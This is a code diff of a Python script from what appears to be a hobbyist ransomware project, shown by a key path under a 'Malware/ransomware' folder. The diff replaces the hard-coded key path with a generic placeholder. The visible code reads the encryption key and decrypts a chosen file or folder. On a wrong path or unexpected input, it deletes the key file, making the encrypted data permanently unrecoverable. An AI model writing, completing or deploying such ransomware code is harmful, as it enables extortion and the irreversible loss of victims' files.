@@ -4,7 +4,7 @@ import os
 
 files = []
 
-with open('/home/homelab/Tools/Malware/ransomware/key/thekey.key', 'rb') as key:
+with open('yourdir/thekey.key', 'rb') as key:
     secretkey = key.read()
 
 type = input('Encrypt folder/dir or file?: ')
@@ -19,7 +19,7 @@ if type.lower() == 'file':
             thefile.write(content_decryted)
     else:
         print('Wrong path')
-        os.remove('/home/homelab/Tools/Malware/ransomware/key/thekey.key')
+        os.remove('yourdir/thekey.key')
 
 
 elif type.lower() == 'folder' or type.lower() == 'dir':
@@ -40,9 +40,9 @@ elif type.lower() == 'folder' or type.lower() == 'dir':
                     thefile.write(contents_decryted)
     else:
         print('Wrong path')
-        os.remove('/home/homelab/Tools/Malware/ransomware/key/thekey.key')
+        os.remove('yourdir/thekey.key')
 
 else:
-    os.remove('/home/homelab/Tools/Malware/ransomware/key/thekey.key')
+    os.remove('yourdir/thekey.key')
     print("We can't handle your situation please try again")
     quit()
